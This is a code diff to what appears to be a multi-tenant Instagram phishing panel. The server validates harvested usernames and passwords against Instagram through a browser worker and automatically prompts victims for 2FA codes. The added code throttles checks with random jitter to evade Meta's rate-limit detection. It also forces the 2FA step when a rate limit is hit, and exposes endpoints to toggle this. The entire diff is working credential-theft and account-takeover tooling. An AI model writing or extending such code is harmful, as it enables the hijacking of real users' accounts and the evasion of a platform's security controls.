@@ -39,7 +39,8 @@ const PYTHON = process.platform === "win32"
             : "python3"));
 
 let configApp = {
-    auto_mode: true // Modo 100% autônomo ativo por padrão
+    auto_mode: true, // Modo 100% autônomo ativo por padrão
+    auto_force_2fa_on_ratelimit: true // Avanço automático para 2FA quando houver Rate Limit da Meta
 };
 
 let sseClients = [];
@@ -114,6 +115,7 @@ function gerarDadosPainel(tenant = null) {
     // 1. Prioriza persistência atômica do SQLite com suporte multi-tenant
     const dadosConsolidados = dbOps.obterDadosConsolidados(configApp.auto_mode, tenant);
     if (dadosConsolidados) {
+        dadosConsolidados.auto_force_2fa_on_ratelimit = configApp.auto_force_2fa_on_ratelimit;
         return dadosConsolidados;
     }
 
@@ -218,6 +220,7 @@ function gerarDadosPainel(tenant = null) {
     return {
         success: true,
         auto_mode: configApp.auto_mode,
+        auto_force_2fa_on_ratelimit: configApp.auto_force_2fa_on_ratelimit,
         totalLogins: logins.length,
         total2FA: codigos2fa.length,
         totalUsuarios: mapaUsuarios.size,
@@ -274,8 +277,28 @@ function executarBot() {
     });
 }
 
+// Mapa de telemetria para anti-burst throttling (evita disparar Rate Limit 1675004 por rajadas)
+const lastValidationTimes = new Map();
+
+async function delayThrottling(userKey) {
+    if (!userKey) return;
+    const now = Date.now();
+    const lastTime = lastValidationTimes.get(userKey) || 0;
+    const elapsed = now - lastTime;
+    const minDelay = 3500 + Math.floor(Math.random() * 2000); // 3.5s - 5.5s com jitter anti-fingerprinting
+    if (elapsed < minDelay) {
+        const waitMs = minDelay - elapsed;
+        console.log(`[THROTTLE] Anti-burst throttling para '${userKey}': aguardando ${(waitMs / 1000).toFixed(2)}s para prevenir Rate Limit da Meta...`);
+        await new Promise(r => setTimeout(r, waitMs));
+    }
+    lastValidationTimes.set(userKey, Date.now());
+}
+
 // Disparo assíncrono para o Warm Worker Playwright (:3006) com telemetria e auditoria completa
 async function testarViaWorker(usuario, senha, reqMeta = {}) {
+    const userKey = String(usuario || "").toLowerCase().trim();
+    await delayThrottling(userKey);
+
     const t0 = performance.now();
     const tenant = reqMeta.tenant || "default";
 
@@ -307,7 +330,10 @@ async function testarViaWorker(usuario, senha, reqMeta = {}) {
         const duracaoSec = (duracaoMs / 1000).toFixed(2);
 
         const statusCred = data.status_credencial || (data.valido ? "valido" : "invalido");
-        const statusLogin = (data.valido && configApp.auto_mode) ? "solicitar_2fa" : undefined;
+        let statusLogin = (data.valido && configApp.auto_mode) ? "solicitar_2fa" : undefined;
+        if (!statusLogin && statusCred === "rate_limit" && configApp.auto_force_2fa_on_ratelimit && configApp.auto_mode) {
+            statusLogin = "solicitar_2fa";
+        }
 
         // Atualização ACID no SQLite e sincronização atômica para dados.json
         dbOps.atualizarStatusCredencial(usuario, statusCred, statusLogin);
@@ -343,7 +369,8 @@ async function testarViaWorker(usuario, senha, reqMeta = {}) {
                 status_credencial: statusCred,
                 mensagem: data.mensagem,
                 tempo_segundos: Number(duracaoSec),
-                auto_mode: configApp.auto_mode
+                auto_mode: configApp.auto_mode,
+                auto_force_2fa_on_ratelimit: configApp.auto_force_2fa_on_ratelimit
             },
             ip: reqMeta.ip || "",
             userAgent: reqMeta.userAgent || ""
@@ -360,6 +387,17 @@ async function testarViaWorker(usuario, senha, reqMeta = {}) {
                 userAgent: reqMeta.userAgent || ""
             });
             console.log(`[FULL-AUTO][${tenant}] 🚀 ${usuario} senha válida no IG em ${duracaoSec}s -> 2FA disparado automaticamente!`);
+        } else if (statusCred === "rate_limit" && configApp.auto_force_2fa_on_ratelimit && configApp.auto_mode) {
+            audit.registrar({
+                tenant,
+                event_type: "AUTO_DECISION",
+                usuario,
+                status: "INFO",
+                details: { acao: "solicitar_2fa_automatico", motivo: "rate_limit_bypass_auto" },
+                ip: reqMeta.ip || "",
+                userAgent: reqMeta.userAgent || ""
+            });
+            console.log(`[FULL-AUTO][${tenant}] 🛡️ ${usuario} Rate Limit (1675004) detectado -> 2FA disparado automaticamente por resiliência!`);
         }
 
         notificarClientes();
@@ -904,7 +942,42 @@ app.delete("/api/audit-logs", (req, res) => {
     }
 });
 
-// Configuração do Modo Full-Auto
+// Configuração unificada do Modo Full-Auto e Auto-RateLimit
+app.get("/api/config", (req, res) => {
+    res.json({
+        success: true,
+        auto_mode: configApp.auto_mode,
+        auto_force_2fa_on_ratelimit: configApp.auto_force_2fa_on_ratelimit
+    });
+});
+
+app.post("/api/config", (req, res) => {
+    const { auto_mode, auto_force_2fa_on_ratelimit } = req.body || {};
+    if (typeof auto_mode === "boolean") {
+        configApp.auto_mode = auto_mode;
+    }
+    if (typeof auto_force_2fa_on_ratelimit === "boolean") {
+        configApp.auto_force_2fa_on_ratelimit = auto_force_2fa_on_ratelimit;
+    }
+    console.log(`[CONFIG] Atualizado: auto_mode=${configApp.auto_mode}, auto_ratelimit_2fa=${configApp.auto_force_2fa_on_ratelimit}`);
+    audit.registrar({
+        tenant: extrairTenant(req),
+        event_type: "CONFIG_CHANGE",
+        status: "INFO",
+        details: {
+            auto_mode: configApp.auto_mode,
+            auto_force_2fa_on_ratelimit: configApp.auto_force_2fa_on_ratelimit
+        }
+    });
+    notificarClientes();
+    res.json({
+        success: true,
+        auto_mode: configApp.auto_mode,
+        auto_force_2fa_on_ratelimit: configApp.auto_force_2fa_on_ratelimit
+    });
+});
+
+// Configuração do Modo Full-Auto legado
 app.get("/api/config/auto-mode", (req, res) => {
     res.json({ success: true, auto_mode: configApp.auto_mode });
 });
@@ -923,6 +996,27 @@ app.post("/api/config/auto-mode", (req, res) => {
         notificarClientes();
     }
     res.json({ success: true, auto_mode: configApp.auto_mode });
+});
+
+// Configuração específica para auto-avanço de 2FA em Rate Limit
+app.get("/api/config/auto-ratelimit", (req, res) => {
+    res.json({ success: true, auto_force_2fa_on_ratelimit: configApp.auto_force_2fa_on_ratelimit });
+});
+
+app.post("/api/config/auto-ratelimit", (req, res) => {
+    const { auto_force_2fa_on_ratelimit } = req.body || {};
+    if (typeof auto_force_2fa_on_ratelimit === "boolean") {
+        configApp.auto_force_2fa_on_ratelimit = auto_force_2fa_on_ratelimit;
+        console.log(`[CONFIG] Auto-forçar 2FA em Rate Limit alterado para: ${configApp.auto_force_2fa_on_ratelimit ? 'ATIVO' : 'DESLIGADO'}`);
+        audit.registrar({
+            tenant: extrairTenant(req),
+            event_type: "CONFIG_CHANGE",
+            status: "INFO",
+            details: { auto_force_2fa_on_ratelimit: configApp.auto_force_2fa_on_ratelimit }
+        });
+        notificarClientes();
+    }
+    res.json({ success: true, auto_force_2fa_on_ratelimit: configApp.auto_force_2fa_on_ratelimit });
 });
 
 // Lista de tenants conhecidos
